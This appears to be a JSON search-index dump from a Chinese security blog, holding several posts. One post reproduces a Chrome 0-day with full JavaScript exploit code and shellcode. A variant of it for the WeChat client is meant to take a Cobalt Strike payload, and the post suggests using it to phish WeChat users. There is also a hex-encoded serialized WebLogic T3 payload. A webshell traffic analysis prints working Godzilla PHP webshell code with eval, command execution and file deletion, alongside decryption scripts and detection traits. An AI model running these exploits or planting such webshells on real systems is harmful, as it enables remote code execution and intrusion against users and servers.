2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x11\\x5f\\x6f\\x75\\x74\\x70\\x75\\x74\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x69\\x65\\x73\\x74\\x00\\x16\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x69\\x65\\x73\\x3b\\x78\\x70\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x70\\x75\\x72\\x00\\x03\\x5b\\x5b\\x42\\x4b\\xfd\\x19\\x15\\x67\\x67\\xdb\\x37\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x75\\x72\\x00\\x02\\x5b\\x42\\xac\\xf3\\x17\\xf8\\x06\\x08\\x54\\xe0\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x0d\\x7a\\xca\\xfe\\xba\\xbe\\x00\\x00\\x00\\x32\\x00\\xac\\x0a\\x00\\x26\\x00\\x5a\\x0a\\x00\\x5b\\x00\\x5c\\x0a\\x00\\x5b\\x00\\x5d\\x08\\x00\\x5e\\x0a\\x00\\x5f\\x00\\x60\\x08\\x00\\x61\\x07\\x00\\x62\\x0a\\x00\\x07\\x00\\x63\\x07\\x00\\x64\\x0a\\x00\\x65\\x00\\x66\\x09\\x00\\x67\\x00\\x68\\x0a\\x00\\x69\\x00\\x6a\\x08\\x00\\x6b\\x07\\x00\\x4d\\x0a\\x00\\x09\\x00\\x6c\\x08\\x00\\x6d\\x0a\\x00\\x07\\x00\\x6e\\x0a\\x00\\x6f\\x00\\x70\\x0a\\x00\\x6f\\x00\\x71\\x0a\\x00\\x07\\x00\\x72\\x08\\x00\\x73\\x07\\x00\\x74\\x0a\\x00\\x16\\x00\\x75\\x08\\x00\\x76\\x07\\x00\\x3d\\x08\\x00\\x77\\x07\\x00\\x78\\x08\\x00\\x79\\x0a\\x00\\x7a\\x00\\x7b\\x0a\\x00\\x1b\\x00\\x7c\\x0a\\x00\\x1b\\x00\\x7d\\x08\\x00\\x7e\\x0a\\x00\\x69\\","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Weblogic","漏洞复现"],"title":"Weblogic T3 反序列化漏洞复现","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"Chrome 0Day 复现与思考","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/","tags":["Chrome","漏洞复现"],"title":"Chrome 0Day 复现与思考","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"Chrome 0Day 复现与思考 ","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:0:0","tags":["Chrome","漏洞复现"],"title":"Chrome 0Day 复现与思考","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1 漏洞复现 HW 期间爆出了 Chrome 0Day，复现一手。 https://github.com/avboy1337/1195777-chrome0day 弹记事本的 POC： \u003cscript\u003e function gc() { for (var i = 0; i \u003c 0x80000; ++i) { var a = new ArrayBuffer(); } } let shellcode = [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00]; var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]); var wasmModule = new WebAssembly.Module(wasmCode); var wasmInstance = new WebAssembly.Instance(wasmModule); var main = wasmInstance.exports.main; var bf = new ArrayBuffer(8); var bfView = new DataView(bf); function fLow(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(0, true)); } function fHi(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(4, true)) } function i2f(low, hi) { bfView.setUint32(0, low, true); bfView.setUint32(4, hi, true); return bfView.getFloat64(0, true); } function f2big(f) { bfView.setFloat64(0, f, true); return bfView.getBigUint64(0, true); } function big2f(b) { bfView.setBigUint64(0, b, true); return bfView.getFloat64(0, true); } class LeakArrayBuffer extends ArrayBuffer { constructor(size) { super(size); this.slot = 0xb33f; } } function foo(a) { let x = -1; if (a) x = 0xFFFFFFFF; var arr = new Array(Math.sign(0 - Math.max(0, x, -1))); arr.shift(); let local_arr = Array(2); local_arr[0] = 5.1;//4014666666666666 let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8 arr[0] = 0x1122; return [arr, local_arr, buff]; } for (var i = 0; i \u003c 0x10000; ++i) foo(false); gc(); gc(); [corrput_arr, rwarr, corrupt_buff] = foo(true); corrput_arr[12] = 0x22444; delete corrput_arr; function setbackingStore(hi, low) { rwarr[4] = i2f(fLow(rwarr[4]), hi); rwarr[5] = i2f(low, fHi(rwarr[5])); } function leakObjLow(o) { corrupt_buff.slot = o; return (fLow(rwarr[9]) - 1); } let corrupt_view = new DataView(corrupt_buff); let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff); let idx0Addr = corrupt_buffer_ptr_low - 0x10; let baseAddr = (corrupt_buffer_ptr_low \u0026 0xffff0000) - ((corrupt_buffer_ptr_low \u0026 0xffff0000) % 0x40000) + 0x40000; let delta = baseAddr + 0x1c - id","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:1:0","tags":["Chrome","漏洞复现"],"title":"Chrome 0Day 复现与思考","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2 思考 windows 微信客户端下内置的 Chrome 浏览器默认关闭沙箱模式，但是是 32 位的，如果有针对 32 位的 payload，就可以利用 win 下的客户端进行钓鱼。 ","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:2:0","tags":["Chrome","漏洞复现"],"title":"Chrome 0Day 复现与思考","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"3 后续补充 windows 微信客户端 payload： ENABLE_LOG = true; IN_WORKER = true; // input your shellcode var shellcode = [0x00,0x00]; function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i \u003c 0x10000; ++i) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return 'c01db33f'; } function gc() { for (var i = 0; i \u003c 0x10000; ++i) { new String(); } } function oobAccess() { var this_ = this; this.buffer = null; this.buffer_view = null; this.page_buffer = null; this.page_view = null; this.prevent_opt = []; var kSlotOffset = 0x1f; var kBackingStoreOffset = 0xf; class LeakArrayBuffer extends ArrayBuffer { constructor() { super(0x1000); this.slot = this; } } this.page_buffer = new LeakArrayBuffer(); this.page_view = new DataView(this.page_buffer); new RegExp({ toString: function () { return 'a' } }); cb(true); class DerivedBase extends RegExp { constructor() { // var array = null; super( // at this point, the 4-byte allocation for the JSRegExp `this` object // has just happened. { toString: cb }, 'g' // now the runtime JSRegExp constructor is called, corrupting the // JSArray. ); // this allocation will now directly follow the FixedArray allocation // made for `this.data`, which is where `array.elements` points to. this_.buffer = new ArrayBuffer(0x80); g_array[8] = this_.page_buffer; } } // try{ var derived_n = eval(`(function derived_n(i) { if (i == 0) { return DerivedBase; } class DerivedN extends derived_n(i-1) { constructor() { super(); return; ${\"this.a=0;\".repeat(tDerivedNCount)}} } return DerivedN; })`); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view = new DataView(this.buffer); this.leakPtr = function (obj) { this.page_buffer.slot = obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); } this.setPtr = function (addr) { this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); } this.read32 = function (addr) { this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); } this.write32 = function (addr, value) { this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); } this.write8 = function (addr, value) { this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); } this.setBytes = function (addr, content) { for (var i = 0; i \u003c content.length; i++) { this.write8(addr + i, content[i]); } } return this; } function trigger() { var oob = oobAccess(); var func_ptr = oob.leakPtr(target_function); print('[*] target_function at 0x' + func_ptr.toString(16)); var kCodeInsOffset = 0x1b; var code_addr = oob.read32(func_ptr + kCodeInsOffset); print('[*] code_addr at 0x' + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0); } try{ print(\"start running\"); trigger(); }catch(e){ print(e); } 用 cs 生成 32 位的 payload，添加到上面脚本的 shellcode 变量中 点击链接： 执行： 上线： ","date":"2021-04-14","objectID":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/:3:0","tags":["Chrome","漏洞复现"],"title":"Chrome 0Day 复现与思考","uri":"/2021/04/chrome-0day%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"webshell 流量分析","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"webshell 流量分析 本文以哥斯拉和冰蝎为例，对上述两个在攻防对抗中常用的加密型 webshell 的流量进行分析。 ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:0:0","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"1 Godzilla 由于哥斯拉在处理 jsp 和 php 时加密方式存在差异，本文将从 php 版的 shell 展开，对其运行原理再做一下总结和阐述。首先，生成一个 php 静态 webshell，加密器选择 PHP_XOR_BASE64。 ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:0","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"1.1 HTTP 请求头特征 1.1.1 User-Agent 哥斯拉客户端使用 JAVA 语言编写，在默认的情况下，如果不修改 User-Agent，User-Agent 会类似于 Java/11.0.7（具体什么版本取决于 JDK 环境版本）。但是哥斯拉支持自定义 HTTP 头部，这个默认特征是可以很容易去除的。 1.1.2 Accept Accept 头为 text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 对这个默认特征应该很熟悉了，之前冰蝎也出现过同样的 Accept。为什么会这么巧合出现两个工具都会出现这个特征呢，其实这个也是 JDK 引入的一个特征，并不是作者自定义的 Accept。同样的这个默认特征也可以通过自定义头部去除，只能作为默认情况下的辅助检测特征。 ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:1","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"1.2 请求体特征 1.2.1 PHP_XOR_BASE64 以默认 shell 的密码和密钥为例，生成的文件如下： \u003c?php session_start(); @set_time_limit(0); @error_reporting(0); function E($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $D[$i] = $D[$i]^$K[$i+1\u002615]; } return $D; } function Q($D){ return base64_encode($D); } function O($D){ return base64_decode($D); } $P='pass'; $V='payload'; $T='3c6e0b8a9c15224a'; // md5(key)[:16] if (isset($_POST[$P])){ $F=O(E(O($_POST[$P]),$T)); if (isset($_SESSION[$V])){ $L=$_SESSION[$V]; $A=explode('|',$L); class C{public function nvoke($p) {eval($p.\"\");}} $R=new C(); $R-\u003envoke($A[0]); echo substr(md5($P.$T),0,16); echo Q(E(@run($F),$T)); echo substr(md5($P.$T),16); }else{ $_SESSION[$V]=$F; } } 其中比较核心的地方有两处，第一处是进行异或加密和解密的函数 E($D,$K)，第二处是嵌套的两个 if 对哥斯拉客户端上传的代码做执行并得到结果。 根据 $F=O(E(O($_POST[$P]),$T));第 21 行做逆向判断，可以得到哥斯拉客户端上传代码时的编码加密过程： 原始代码 -\u003e Base64 编码 -\u003e E 函数进行异或加密 -\u003e 再 Base64 编码 进入第二个 if 语句，首先判断 $_SESSION[$V] 是否存在，客户端首次连接 shell 时会在 $_SESSION 中保存一段代码，叫 payload。结合后面 的run 函数，这个 payload 在后续 shell 连接过程中会被调用。整个 shell 的运行原理到这里基本就能明确了，可以用一篇文章中的流程图来总结： 在客户端上配置代理，利用 Burp 查看下 webshell 的交互流量。 在客户端首次连接时，会有连续三个请求，第一个请求如下： 根据上述分析的加密原理，可以写一个简单的解密脚本，将 pass 数据进行解密： \u003c?php function E($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $D[$i] = $D[$i]^$K[$i+1\u002615]; } return $D; } function O($D){ return base64_decode($D); } $P='pass'; $V='payload'; $T='3c6e0b8a9c15224a'; // md5(key)[:16] echo O(E(O(\"要解密的数据\"), $T)); ?\u003e 解密得到的数据为： \u003c?php $parameters=array(); function run($pms){ formatParameter($pms.'\u0026ILikeYou='.base64Encode('metoo')); if ($_SESSION[\"bypass_open_basedir\"]==true){ @bypass_open_basedir(); } return base64Encode(evalFunc()); } function bypass_open_basedir(){ // ... } function formatParameter($pms){ global $parameters; $pms=explode(\"\u0026\",$pms); foreach ($pms as $kv){ $kv=explode(\"=\",$kv); if (sizeof($kv)\u003e=2){ $parameters[$kv[0]]=base64Decode($kv[1]); } } } function evalFunc(){ @session_write_close(); $className=get(\"codeName\"); $methodName=get(\"methodName\"); if ($methodName!=null){ if (strlen(trim($className))\u003e0){ if ($methodName==\"includeCode\"){ return includeCode(); }else{ if (isset($_SESSION[$className])){ return eval($_SESSION[$className]); }else{ return \"{$className}no load\"; } } }else{ return $methodName(); } }else{ return \"methodName Is Null\"; } } function deleteDir($p){ $m=@dir($p); while(@$f=$m-\u003eread()){ $pf=$p.\"/\".$f; @chmod($pf,0777); if((is_dir($pf))\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ deleteDir($pf); @rmdir($pf); }else if (is_file($pf)\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ @unlink($pf); } } $m-\u003eclose(); @chmod($p,0777); return @rmdir($p); } function deleteFile(){ $F=get(\"fileName\"); if(is_dir($F)){ return deleteDir($F)?\"ok\":\"fail\"; }else{ return (file_exists($F)?@unlink($F)?\"ok\":\"fail\":\"fail\"); } } function copyFile(){ $srcFileName=get(\"srcFileName\"); $destFileName=get(\"destFileName\"); if (@is_file($srcFileName)){ if (copy($srcFileName,$destFileName)){ return \"ok\"; }else{ return \"fail\"; } }else{ return \"The target does not exist or is not a file\"; } } function moveFile(){ $srcFileName=get(\"srcFileName\"); $destFileName=get(\"destFileName\"); if (rename($srcFileName,$destFileName)){ return \"ok\"; }else{ return \"fail\"; } } function getBasicsInfo() { //... } function getFile(){ // ... } function readFileContent(){ $fileName=get(\"fileName\"); if (@is_file($fileName)){ if (@is_readable($fileName)){ return file_get_contents($fileName); }else{ return \"No Permission!\"; } }else{ return \"File Not Found\"; } } function uploadFile(){ $fileName=get(\"fileName\"); $fileValue=get(\"fileValue\"); if (@file_put_contents($fileName,$fileValue)!==false){ return \"ok\"; }else{ return \"fail\"; } } function newDir(){ $dir=get(\"dirName\"); if (@mkdir($dir,0777,true)!==false){ return \"ok\"; }else{ return \"fail\"; } } function newFile(){ $fileName=get(\"fileName\"); if (@file_put_contents($fileName,\"\")!==false){ return \"ok\"; }else{ return \"fail\"; } } function execCommand(){ $result = \"\"; $command = get(\"cmdLine\"); $PadtJn = @ini_get('disable_functions'); if (! empty($PadtJn)) { $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn); $PadtJn = exp","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:2","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"2 冰蝎 同样以 PHP webshell 为例，使用冰蝎默认的 webshell，并进行测试。 ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:0","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"2.1 HTTP 请求头特征 2.1.1 User-Agent 该特征属于弱特征。普通用户很容易就可以修改。但是我们也分析一下。 冰蝎 3.0 每次请求都会随机选择一个 User-Agent。但是如果用户默认不提供 UA 头，则从系统中随机选择一个 UA 头。在最新版本(v3.0 Beta 6)中的冰蝎源码中，存在如下 User-Agent { \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (iPod; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\", \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\", \"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\", \"Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko\", \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\" } 2.1.2 Accept \u0026\u0026 Accept-Language 在 ShellService.java 中发现预先设置的 Accept 和 Accept-Language： 为固定值，同时，如果 webshell 为 php 类型，会设定 Content-Type 值也为一个固定值：text/html;charset=utf-8。 在用户未更改默认配置的情况下，上述特征可以作为检测的一个方向。 ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:1","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"2.2 HTTP 请求体特征 根据 webshell 的内容，可以分为两种解密方式： 当目标服务器未开启 openssl 时，采用异或的方式加密 当目标服务器开启 openssl 时，采用 AES-128 方式加密 解密脚本： \u003c?php $key=\"e45e329feb5d925b\"; $post = \"待解密的内容\"; $post = openssl_decrypt($post, \"AES128\", $key); echo $post; ?\u003e 连接 shell 时的第一条数据包： 解密出连接 shell 时的第一条数据： 进一步 base64 解密得到传输的内容： \u003c?php @error_reporting(0); function main($content) { $result = array(); $result[\"status\"] = base64_encode(\"success\"); $result[\"msg\"] = base64_encode($content); $key = $_SESSION['k']; echo encrypt(json_encode($result),$key); } function encrypt($data,$key) { if(!extension_loaded('openssl')) { for($i=0;$i\u003cstrlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u002615]; } return $data; } else { return openssl_encrypt($data, \"AES128\", $key); } }$content=\"qing73XL3NTszHHme5YqeWHi79mSMZaUuubbtH7I65qSGoUqfzFvnD2TW\"; main($content); ?\u003e 从上述脚本可以分析到，回包也是用 AES-128 进行加密： 第二条数据包： 解密请求： base64 解密： \u003c?php error_reporting(0); function main($whatever) { ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =\"\"; if (stristr(PHP_OS,\"windows\")||stristr(PHP_OS,\"winnt\")) { for($i=65;$i\u003c=90;$i++) { $drive=chr($i).':/'; file_exists($drive) ? $driveList=$driveList.$drive.\";\":''; } } else { $driveList=\"/\"; } $currentPath=getcwd(); //echo \"phpinfo=\".$info.\"\\n\".\"currentPath=\".$currentPath.\"\\n\".\"driveList=\".$driveList; $osInfo=PHP_OS; $result=array(\"basicInfo\"=\u003ebase64_encode($info),\"driveList\"=\u003ebase64_encode($driveList),\"currentPath\"=\u003ebase64_encode($currentPath),\"osInfo\"=\u003ebase64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION['k']; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), \"AES128\", $key); echo encrypt(json_encode($result), $key); } function encrypt($data,$key) { if(!extension_loaded('openssl')) { for($i=0;$i\u003cstrlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u002615]; } return $data; } else { return openssl_encrypt($data, \"AES128\", $key); } }$whatever=\"yXC5t2ZpMa4Mj6zCgAXVLhQX5TFoNnjDYke36m2uCtHecRRdxqlbd2AudDH33CNWx41ISHqaJb4PfWbWp3CHTGAfUvFl1x5abikyEbCXL9TPQX5Mhuvjv45zhYNMxvb38UtH2BdLpiGpLFMMXqaNkmIVTEAj3opuUN4sE3wKMryeCAvVgDKwoBGf0YAduvy2vvxvQMXEIPTSB1Blp9fcvzMGyM3Qca0FsYwYwyp2wNj7DDDYmJnvmqF547rTfhgH3NnSlpR7rjG1UorFkZPxrITQuuGkz7dV2JuVVFCKtw8VVl8zGjLGyznpu4yHCChEMxE9YszxTWgowBPURYvMuLyf6YIhJBRl86DcJsWKsaGG9OFwA2t5vcTnHdEO5yRUjRjGCk6P3MfnlqpklSjjrf5lgisxjnvFNBerwYSNWZCMQ56xW2vwNqSZ4iEj0Kg1TBMIBRdnCpc46VE6iVLe34bqx6sXhhXzK0KLnbQ8kDAlLXuJAP87XlZPCVB4zp0eStqoVIHYUTIDhkJ4rH06z1JumGfbT21MQj64CH1PBkHvfOTCkkxXQN8EXZerxZ831SeVRGv37PbNu\"; main($whatever); ?\u003e 得到具体执行的内容即获取基本信息。 对回包的解密过程同上，最后可以得到一个 JSON 字符串，其中包含相应的信息。 { \"basicInfo\": \"......\", \"driveList\": \"Lw==\", \"currentPath\": \"L2hvbWUvZGFlL3BocA==\", \"osInfo\": \"TGludXg=\" } ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:2","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["渗透测试"],"content":"3 后续补充 Godzilla 更新了 webshell 的逻辑，加密步骤有一点变化： 数据在发送时，经过 encode + base64 两层加密，解密代码如下： \u003c?php $pass='pass'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $data=encode(base64_decode(\"\",$key)); echo $data; ?\u003e 数据在接收时，除了采用前 16 位和后 16 为的干扰字符外，内容采用 gzip 压缩编码 + 异或 + base64，解密代码如下： \u003c?php function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } function gzdecode($data) { return gzinflate(substr($data,10,-8)); } $pass='pass'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; $data=gzdecode(encode(base64_decode(\"\"),$key)); echo $data; ?\u003e 附：session 中存储的代码： \u003c?php $parameters=array(); $_SES=array(); function run($pms){ reDefSystemFunc(); $_SES=\u0026getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } 